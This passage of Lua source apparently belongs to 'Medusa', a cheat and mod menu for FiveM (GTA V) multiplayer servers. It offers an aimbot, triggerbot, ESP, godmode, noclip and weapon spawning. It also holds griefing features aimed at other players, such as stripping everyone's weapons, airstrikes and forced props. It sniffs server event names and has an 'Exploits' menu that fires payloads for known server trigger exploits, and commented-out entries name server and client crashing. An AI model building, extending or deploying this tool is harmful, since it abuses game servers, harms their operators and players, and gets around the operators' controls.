	Medusa.CreateSubMenu("OnlineTrollMenu", "PlayerOptionsMenu", "Troll Options")

	-- ONLINE PLAYERS > PLAYER > TROLL > RAINMENU
	Medusa.CreateSubMenu("RainMenu", "OnlineTrollMenu", "Rain Menu")
	Medusa.CreateSubMenu("PropMenu", "OnlineTrollMenu", "Prop Menu")

	Medusa.CreateSubMenu("CustomMenu", "RainMenu", "Rain Custom")
	Medusa.CreateSubMenu("BikeMenu", "RainMenu", "Bike Spam")
	Medusa.CreateSubMenu("CarMenu", "RainMenu", "Vehicle Spam")

	-- ONLINE PLAYERS > PLAYER > TROLL > RAINMENU > RAINLEGIT
	Medusa.CreateSubMenu("RainCustoLegit", "CustomMenu", "Rain Legit")

	-- ONLINE PLAYERS > PLAYER > TROLL > RAINMENU > RAINSPAM
	Medusa.CreateSubMenu("RainCustoSpam", "CustomMenu", "Rain Spam")

	-- ONLINE PLAYERS > PLAYER > TROLL > RAINMENU > RAINLEGIT
	Medusa.CreateSubMenu("RainCarLegit", "CarMenu", "Rain Legit")

	-- ONLINE PLAYERS > PLAYER > TROLL > RAINMENU > RAINSPAM
	Medusa.CreateSubMenu("RainCarSpam", "CarMenu", "Rain Spam")

	-- ONLINE PLAYERS > PLAYER > TROLL > RAINMENU > RAINLEGIT
	Medusa.CreateSubMenu("RainBikeLegit", "BikeMenu", "Rain Legit")

	-- ONLINE PLAYERS > PLAYER > TROLL > RAINMENU > RAINSPAM
	Medusa.CreateSubMenu("RainBikesSpam", "BikeMenu", "Rain Spam")

	
	Medusa.CreateSubMenu('OnlineVehicleMenuPlayer', 'PlayerOptionsMenu', "Vehicle Options")
	Medusa.CreateSubMenu('ESXMenuPlayer', 'PlayerOptionsMenu', "ESX Options")

	Medusa.CreateSubMenu("LocalWepCategory", "LocalWepMenu", "Give Weapon")
	Medusa.CreateSubMenu("LocalMeleeWeapons", "LocalWepCategory", "Melee")
	Medusa.CreateSubMenu("LocalSidearmWeapons", "LocalWepCategory", "Handguns")
	Medusa.CreateSubMenu("LocalSmgWeapons", "LocalWepCategory", "Submachine Guns")
	Medusa.CreateSubMenu("LocalShotgunWeapons", "LocalWepCategory", "Shotguns")
	Medusa.CreateSubMenu("LocalAssaultRifleWeapons", "LocalWepCategory", "Assault Rifles")
	Medusa.CreateSubMenu("LocalMachineGunWeapons", "LocalWepCategory", "Light Machine Guns")
	Medusa.CreateSubMenu("LocalSniperRifles", "LocalWepCategory", "Sniper Rifles")
	Medusa.CreateSubMenu("LocalHeavyWeapons", "LocalWepCategory", "Heavy Weapons")

	-- Resources Info

	
	Medusa.CreateSubMenu("MenuSettingsColor", "MenuSettings", "Change Menu Color")
	Medusa.CreateSubMenu("MenuSettingsCredits", "MenuSettings", "Credits")
	
	for i, mod in pairs(LSC.vehicleMods) do
		Medusa.CreateSubMenu(mod.meta, 'lsc_bodywork', mod.name)
	end

	Medusa.CreateSubMenu("primary", "lscrepsray", "Primary Color")
	Medusa.CreateSubMenu("secondary", "lscrepsray", "Secondary Color")

	Medusa.CreateSubMenu("rimpaint", "lscrepsray", "Wheel Paint")

	local SelectedPlayer = nil
	local SelectedResource = nil

	-- Event sniffing
	for _, resource in pairs(validResources) do

		for key, name in pairs(validResourceEvents[resource]) do
			local event = string.lower(name)

			-- Revive event
			if string.match(event, 'revive') then
				Medusa.Events.Revive[#Medusa.Events.Revive + 1] = name
			end
		end

	end

    Medusa.OpenMenu("MedusaMainMenu")
	while isMenuEnabled do

		

		-- END MATH



		Medusa.Player.Vehicle = GetVehiclePedIsUsing(PlayerPedId())
		

		if IsDisabledControlJustPressed(0, Medusa.Keys["DELETE"]) then
			if not Medusa.IsAnyMenuOpened() then
				Medusa.OpenMenu("MedusaMainMenu")
			end
		end



		if Medusa.IsMenuOpened("MedusaMainMenu") then
			Medusa.MenuButton("Self", "SelfMenu")
			Medusa.MenuButton("Others", "Others")
			Medusa.MenuButton("Misc", "Misc")
			Medusa.MenuButton("Triggers", "Triggers")
			Medusa.MenuButton("Fun", "Fun")
			Medusa.Display()
		elseif Medusa.IsMenuOpened("Fun") then
			--if Medusa.CheckBox("Drift", Drift, function(enabled) Drift = enabled end) then end
			Medusa.Display()
		elseif Medusa.IsMenuOpened("Others") then -- APOLO SI QUIERES TOCAR ALGO METETE A LLAMADA PORFAVOR!! PD: YA TIENES LOS TRIGGERS HECHOS 😉 DIME LO SIGUIENTE QUE QUIERES QUE HAGA HAY TE ESPERO EN MI MD 
			Medusa.MenuButton("Online Options", "OnlinePlayersMenu") 
			Medusa.MenuButton("Visual Options", "VisualMenu") 
			Medusa.MenuButton("Global Options", "GlobalMenu")
			Medusa.MenuButton("Aimbot Options", "AimbotOptions")
			Medusa.MenuButton("Teleport Options", "TeleportMenu") 
			Medusa.MenuButton("Vehicle Options", "LocalVehicleMenu") 
			Medusa.MenuButton("Weapon Options", "LocalWepMenu") 
			Medusa.MenuButton("Server Options", "ServerMenu") 
			Medusa.Display()
		elseif Medusa.IsMenuOpened("AimbotOptions") then
			if Medusa.CheckBox("TriggerBot", TriggerBot, function(enabled) TriggerBot = enabled end) then end
				
			if Medusa.CheckBox("AimBot", AimBot, function(enabled) AimBot = enabled end) then 
			
			end
			Medusa.Display()
		elseif Medusa.IsMenuOpened("Misc") then
			Medusa.MenuButton("~b~Menu Settings", "MenuSettings") 
			Medusa.Display()
		elseif Medusa.IsMenuOpened("SelfMenu") then
			if Medusa.MenuButton("Super Powers", "SelfSuperPowers") then end

			-- if Medusa.Button("Sky Dive") then
			-- 	TaskSkyDive(PlayerPedId())
			-- end
			
			if Medusa.Button("Max Health") then
				SetEntityHealth(PlayerPedId(), 200)
			end
			
			if Medusa.Button("Max Armour") then
				SetPedArmour(PlayerPedId(), 200)
			end

			if Medusa.CheckBox("Infinite Stamina", InfStamina, function(enabled) InfStamina = enabled end) then
				
			end

			if Medusa.Button("Revive Self") then
				local al = GetEntityCoords(GetPlayerPed(-1))
				StopScreenEffect("DeathFailOut")
				SetEntityHealth(PlayerPedId(-1), 200)
				ClearPedBloodDamage(GetPlayerPed(-1))
				SetEntityCoordsNoOffset(PlayerPedId(), al.x, al.y, al.z, false, false, false, true)
				NetworkResurrectLocalPlayer(al.x, al.y, al.z, false, true, false)
				TriggerServerEvent("esx:onPlayerSpawn")
				TriggerEvent("esx:onPlayerSpawn")
				TriggerEvent("playerSpawned")
			end

			if Medusa.CheckBox("Ragdoll", Medusa.Toggle.SelfRagdoll) then
				SelfRagdoll()
			end

			if Medusa.CheckBox("Anti-Ragdoll", RagdollToggle, function(enabled) RagdollToggle = enabled end) then end
			
			if Medusa.Button("Suicide") then
				KillYourself()
			end

			if Medusa.Slider("Move Speed", SliderOptions.FastRun.Words, SliderOptions.FastRun.Selected, function(selectedIndex)
				if SliderOptions.FastRun.Selected ~= selectedIndex then 
					SliderOptions.FastRun.Selected = selectedIndex
				end
			end) then end

			if Medusa.CheckBox("Noclip", Medusa.Player.isNoclipping, function(enabled) 
				Medusa.Player.isNoclipping = enabled 
				if Medusa.Player.isNoclipping then
					SetEntityVisible(PlayerPedId(), false, false)
				else
					SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
					SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
					SetEntityVisible(PlayerPedId(), true, false)
				end
			end) then end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("SelfSuperPowers") then
			if Medusa.CheckBox("Godmode", Godmode, function(enabled) Godmode = enabled end) then

			end

			if Medusa.CheckBox("Super Jump", SuperJump, function(enabled) SuperJump = enabled end) then

			end

			if Medusa.CheckBox("Invisibility", Invisible, function(enabled) Invisible = enabled end) then

			end

			if Medusa.CheckBox("Magneto", Medusa.Toggle.MagnetoMode) then
				MagnetoMode()
			end
			Medusa.Display()
		elseif Medusa.IsMenuOpened("TeleportMenu") then
			if Medusa.Button("Teleport to waypoint") then
				TeleportToWaypoint()
			end
	
			Medusa.Display()
		elseif Medusa.IsMenuOpened("VisualMenu") then
			Medusa.MenuButton("ESP Options", "ESPOptions") 	
			if Medusa.CheckBox("ESP", Medusa.Config.ESP.activated, function(enabled) Medusa.Config.ESP.activated = enabled end) then end
			if Medusa.CheckBox("Force Crosshair", Crosshair, function(enabled) Crosshair = enabled end) then end
			if Medusa.CheckBox("Force Minimap", showMinimap, function(enabled) showMinimap = enabled end) then end
			if Medusa.CheckBox("Force Player Blips", playerBlips, function(enabled) playerBlips = enabled end) then end
			if Medusa.CheckBox("Force Gamertags", showNametags, function(enabled) showNametags = enabled end) then end
			if Medusa.CheckBox("Trace Bullet Impacts", Medusa.Options.BulletImpacts, function(enabled) Medusa.Options.BulletImpacts = enabled end) then end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("GlobalMenu") then
			if Medusa.Button("Dance All") then 
                Medusa.Functions.GetPlayers(function(playerId, playerPed)
					TaskStartScenarioInPlace(playerPed, "world_human_muscle_free_weights", 0, true)
				end)
			end
			if Medusa.MenuButton("Props", "GlobalProps") then end

			if Medusa.CheckBox("Particle Troll", Medusa.Options.ParticleTrollAll, function(enabled)
				Medusa.Options.ParticleTrollAll = enabled
			end) then end

			Medusa.Display()
        elseif Medusa.IsMenuOpened("GlobalProps") then
			if Medusa.Button("Make All Washer") then
				Medusa.Functions.GetPlayers(function(playerId, playerPed)
					Medusa.Functions.HeadProp(playerPed, "prop_tool_mopbucket")
				end)
			end
            if Medusa.MenuButton("Make All Custom Prop", "CustomProps") then

            end
            Medusa.Display()
        elseif Medusa.IsMenuOpened("CustomProps") then
            if Medusa.Button("Make All ~b~Custom Prop") then
				Medusa.Functions.GetPlayers(function(playerId, playerPed)
					Medusa.Functions.HeadProp(playerPed, tostring(Medusa.Config.Props.model))
				end)
			end
            if Medusa.Button("Set Custom Prop") then
                local ModelName = KeyboardInput("Enter Model Name", "", 48)
                local model = tostring(ModelName)
                if ModelName and IsModelValid(ModelName) then
                    RequestModel(ModelName)
                    while not HasModelLoaded(ModelName) do
                        Citizen.Wait(0)
                    end
                    Medusa.Config.Props.model = ModelName
                end
			end
            if Medusa.Button('Selected Prop: ~o~"'.. tostring(Medusa.Config.Props.model).. '"' ) then end
            Medusa.Display()
		elseif Medusa.IsMenuOpened("GriefMenu") then
			if Medusa.Button("Airstrike Waypoint") then
				AirstrikeWaypoint()
			end

			if Medusa.Button("Remove All Weapons From Everyone") then
				local plist = GetActivePlayers()
				for i = 1, #plist do
					local id = plist[i]
					local ped = GetPlayerPed(id)
					RequestControlOnce(ped)
					for i = 1, #t_Weapons do
						RemoveWeaponFromPed(ped, t_Weapons[i][1])
					end
				end
			end

			-- if
			-- 	Medusa.CheckBox(
			-- 	"~r~Explode All",
			-- 	blowall,
			-- 	function(enabled)
			-- 	blowall = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	Medusa.CheckBox(
			-- 	"~r~Overload Client Stream",
			-- 	nuke,
			-- 	function(enabled)
			-- 	nuke = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	Medusa.CheckBox(
			-- 	"~r~Trigger Malicious ESX",
			-- 	esxdestroy,
			-- 	function(enabled)
			-- 	esxdestroy = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	Medusa.CheckBox(
			-- 	"~r~Crash Server/Clients",
			-- 	servercrasher,
			-- 	function(enabled)
			-- 	servercrasher = enabled
			-- 	end)
			-- then
			-- end
			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalWepMenu") then
			
			if Medusa.MenuButton("Weapon Spawner", "LocalWepCategory") then
			end

			-- if Medusa.MenuButton("Aimbot Options", "AimbotOptions") then
			-- end

			if Medusa.CheckBox("Rapid Fire", Medusa.Toggle.RapidFire) then
				Medusa.Toggle.RapidFire = not Medusa.Toggle.RapidFire
			end

			-- SetWeaponDamageModifier("WEAPON_PISTOL", 100.0)
			if Medusa.Slider("Damage Modifier", SliderOptions.DamageModifier.Words, SliderOptions.DamageModifier.Selected, function(selectedIndex)
				if SliderOptions.DamageModifier.Selected ~= selectedIndex then
					SliderOptions.DamageModifier.Selected = selectedIndex
				end
			end) then end
			-- Medusa.Functions.Print(GetEntitySpeed(Medusa.Player.Vehicle) * 2.2369356)
			if Medusa.Button("~g~Give All Weapons") then
				PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				for i = 1, #t_Weapons do
					GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 256, false, false)
				end
			end
			
			if Medusa.Button("~r~Remove All Weapons") then
				for i = 1, #t_Weapons do
					RemoveWeaponFromPed(PlayerPedId(), t_Weapons[i][1])
				end
			end

			if Medusa.Button("Set current weapon ammo") then
				local _, weaponHash = GetCurrentPedWeapon(PlayerPedId())
				local amount = KeyboardInput("Ammo amount", "", 3)
				local ammo = floor(tonumber(amount) + 0.5)
				SetPedAmmo(PlayerPedId(), weaponHash, ammo)
			end

			if Medusa.CheckBox("Infinite Ammo", InfAmmo, function(enabled) InfAmmo = enabled SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo) end) then end	
		--	if Medusa.CheckBox("Vehicle Gun", VehicleGun, function(enabled) VehicleGun = enabled end) then end		
			if Medusa.CheckBox("Delete Gun", Medusa.Toggle.DeleteGun) then 
				Medusa.Toggle.DeleteGun = not Medusa.Toggle.DeleteGun
			end

			Medusa.Display()
			-- [NOTE] Local Weapon Menu
		elseif Medusa.IsMenuOpened("LocalWepCategory") then
			Medusa.MenuButton("Melee", "LocalMeleeWeapons")
			Medusa.MenuButton("Handguns", "LocalSidearmWeapons")
			Medusa.MenuButton("Submachine Guns", "LocalSmgWeapons")
			Medusa.MenuButton("Shotguns", "LocalShotgunWeapons")
			Medusa.MenuButton("Assault Rifles", "LocalAssaultRifleWeapons")
			Medusa.MenuButton("Light Machine Guns", "LocalMachineGunWeapons")
			Medusa.MenuButton("Sniper Rifles", "LocalSniperRifles")
			Medusa.MenuButton("Heavy Weapons", "LocalHeavyWeapons")

			Medusa.Display()
		elseif Medusa.IsMenuOpened("Triggers") then
			if Medusa.MenuButton("Resource List", "ServerResources") then end
			if Medusa.MenuButton("Exploits", "TriggersExploits") then end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("TriggersExploits") then
			for _key, _value in pairs(Medusa.TriggerData.KnownTriggerExploits) do
				if _value.canExploit then
					if Medusa.Button(_value.exploitName) then
						_value.triggerPayLoad(_value.triggerDetected)
					end
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("ServerResources") then
			for _key, _value in pairs(Medusa.Resources) do
				if Medusa.MenuButton(_value.name, 'ResourceData') then
					SelectedResource = _value.name
				end
			end
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened('ResourceData') then
			Medusa.SetSubTitle('ResourceData', SelectedResource .. " > Data")
			if Medusa.MenuButton('Event Handlers', 'ResourceCEvents') then end
			if Medusa.MenuButton('Server Events', 'ResourceSEvents') then end
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened('ResourceCEvents') then
			Medusa.SetSubTitle('ResourceCEvents', SelectedResource .. " > Data > Event Handlers")
			for key, name in pairs(Medusa.Resources[SelectedResource].EventHandlers) do
				if Medusa.Button(name) then
					Medusa.Functions.Print(name)
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened('ResourceSEvents') then
			Medusa.SetSubTitle('ResourceSEvents', SelectedResource .. " > Data > Server Events")
			for key, name in pairs(Medusa.Resources[SelectedResource].ServerEvents) do
				if Medusa.Button(name) then
					Medusa.Functions.Print(name)
				end
			end
			
			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalMeleeWeapons") then
			local selectedWeapon = {}
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "melee" then
					if Medusa.Button(t_Weapons[i][2]) then
						PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 0, false, false)
					end
					selectedWeapon[optionCount] = i
				end
			end

			-- Medusa.DrawWeaponPreview(selectedWeapon[menus[currentMenu].currentOption])
			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalSidearmWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "handguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if Medusa.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
							SetPedAmmo(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 125)
						end
					else
						if Medusa.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
							SetPedAmmo(PlayerPedId(), t_Weapons[i][1], 125)
						end
					end
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalAssaultRifleWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "assaultrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if Medusa.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
							SetPedAmmo(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 125)
						end
					else
						if Medusa.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
							SetPedAmmo(PlayerPedId(), t_Weapons[i][1], 125)
						end
					end
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalShotgunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "shotguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if Medusa.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
							SetPedAmmo(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 125)
						end
					else
						if Medusa.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
							SetPedAmmo(PlayerPedId(), t_Weapons[i][1], 125)
						end
					end
				end
			end

			Medusa.Display()	
		elseif Medusa.IsMenuOpened("LocalMachineGunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "lmgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if Medusa.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
							SetPedAmmo(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 125)
						end
					else
						if Medusa.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
							SetPedAmmo(PlayerPedId(), t_Weapons[i][1], 125)
						end
					end
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalSmgWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "smgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if Medusa.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
							SetPedAmmo(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 125)
						end
					else
						if Medusa.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
							SetPedAmmo(PlayerPedId(), t_Weapons[i][1], 125)
						end
					end
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalSniperRifles") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "sniperrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if Medusa.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if Medusa.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
							SetPedAmmo(PlayerPedId(), t_Weapons[i][1], 125)
						end
					end
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalHeavyWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "heavyweapons" then
					if Medusa.Button(t_Weapons[i][2]) then
						PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
							SetPedAmmo(PlayerPedId(), t_Weapons[i][1], 125)
					end
				end
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalVehicleMenu") then

			if Medusa.MenuButton("Vehicle Spawner", "LocalVehicleSpawner") then
			end

			if Medusa.ComboBox("Vehicle Actions", ComboOptions.VehicleActions.Words, ComboOptions.VehicleActions.Selected, function(selectedIndex)
				if ComboOptions.VehicleActions.Selected ~= selectedIndex then
					ComboOptions.VehicleActions.Selected = selectedIndex
				end
			end) then 
				ComboOptions.VehicleActions.Values[ComboOptions.VehicleActions.Selected](Medusa.Player.Vehicle)
			end

			if Medusa.MenuButton("Modify Vehicle", "LSC") then end

			if Medusa.CheckBox("Easy Handling", Medusa.Toggle.EasyHandling) then
				Medusa.Toggle.EasyHandling = not Medusa.Toggle.EasyHandling
			end

			if Medusa.CheckBox("Seatbelt (No Fall)", Medusa.Toggle.VehicleNoFall) then
				Medusa.Toggle.VehicleNoFall = not Medusa.Toggle.VehicleNoFall
			end

			if Medusa.CheckBox("No Collision", Medusa.Toggle.VehicleCollision, function(enabled) 
				Medusa.Toggle.VehicleCollision = enabled
			end) then end

			if Medusa.ComboBox("Vehicle Hygiene", ComboOptions.DirtLevel.Words, ComboOptions.DirtLevel.Selected(Medusa.Player.Vehicle), function(selectedIndex)
				if ComboOptions.DirtLevel.Selected(Medusa.Player.Vehicle) ~= ComboOptions.DirtLevel.Values[selectedIndex] then
					SetVehicleDirtLevel(Medusa.Player.Vehicle, ComboOptions.DirtLevel.Values[selectedIndex])
				end
			end) then end

			if Medusa.Button("Change License Plate") then
				ChangeVehiclePlateText(Medusa.Player.Vehicle)
			end

			if Medusa.CheckBox("Rainbow Vehicle Color", Medusa.Toggle.RainbowVehicle, RainbowVehicle) then 
			end

			if Medusa.CheckBox("Vehicle Godmode", VehGod,
					function(enabled)
						VehGod = enabled
					end) 
				then
			end
			if Medusa.CheckBox("~o~Drift", drift,
					function(enabled)
						Drift = enabled
					end)
				then
			end
			if Medusa.CheckBox("Speedboost ~g~SHIFT ~r~CTRL", VehSpeed,
					function(enabled)
					VehSpeed = enabled
					end)
				then
			end

			Medusa.Display()
		elseif Medusa.IsMenuOpened("LocalVehicleSpawner") then
			if Medusa.CheckBox("Spawn Inside", Medusa.Toggle.SpawnInVehicle, function(enabled)
				Medusa.Toggle.SpawnInVehicle = enabled
			end) then end
			
			if Medusa.CheckBox("Replace Current", Medusa.Toggle.ReplaceVehicle, function(enabled) 
				Medusa.Toggle.ReplaceVehicle = enabled 
			end) then end


			if Medusa.Button("Spawn Vehicle by Hash") then
				local modelName = KeyboardInput("Enter vehicle spawn name", "", 20)
				if not modelName then -- Do nothing in case of accidentel press or change of mind
				elseif IsModelValid(modelName) and IsModelAVehicle(modelName) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				else
					Medusa.SendNotification({text = string.format("%s is not a valid vehicle", modelName), type = 'error'})
				end
			end
			if Medusa.MenuButton("Compacts", "localcompacts") then end
			if Medusa.MenuButton("Sedans", "localsedans") then end
			if Medusa.MenuButton("SUVs", "localsuvs") then end
			if Medusa.MenuButton("Coupes", 'localcoupes') then end
			if Medusa.MenuButton("Muscle", 'localmuscle') then end
			if Medusa.MenuButton("Sports Classics", 'localsportsclassics') then end
			if Medusa.MenuButton("Sports", 'localsports') then end
			if Medusa.MenuButton("Super", 'localsuper') then end
			if Medusa.MenuButton('Motorcycles', 'localmotorcycles') then end
			if Medusa.MenuButton('Off-Road', 'localoffroad') then end
			if Medusa.MenuButton('Industrial', 'localindustrial') then end
			if Medusa.MenuButton('Utility', 'localutility') then end
			if Medusa.MenuButton('Vans', 'localvans') then end
			if Medusa.MenuButton('Cycles', 'localcycles') then end
			if Medusa.MenuButton('Boats', 'localboats') then end
			if Medusa.MenuButton('Helicopters', 'localhelicopters') then end
			if Medusa.MenuButton('Planes', 'localplanes') then end
			if Medusa.MenuButton('Service/Emergency/Military', 'localservice') then end
			if Medusa.MenuButton('Commercial/Trains', 'localcommercial') then end
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localcompacts') then
			for i = 1, #VehicleClass.compacts do
				local modelName = VehicleClass.compacts[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('compacts')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localsedans') then
			for i = 1, #VehicleClass.sedans do
				local modelName = VehicleClass.sedans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('sedans')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localsuvs') then
			for i = 1, #VehicleClass.suvs do
				local modelName = VehicleClass.suvs[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('suvs')
			Medusa.Display()
		elseif Medusa.IsMenuOpened('localcoupes') then
			for i = 1, #VehicleClass.coupes do
				local modelName = VehicleClass.coupes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if Medusa.Button(vehname) then
					SpawnLocalVehicle(modelName, Medusa.Toggle.ReplaceVehicle, Medusa.Toggle.SpawnInVehicle)
				end
			end

			Medusa.DrawVehiclePreview('coupes')
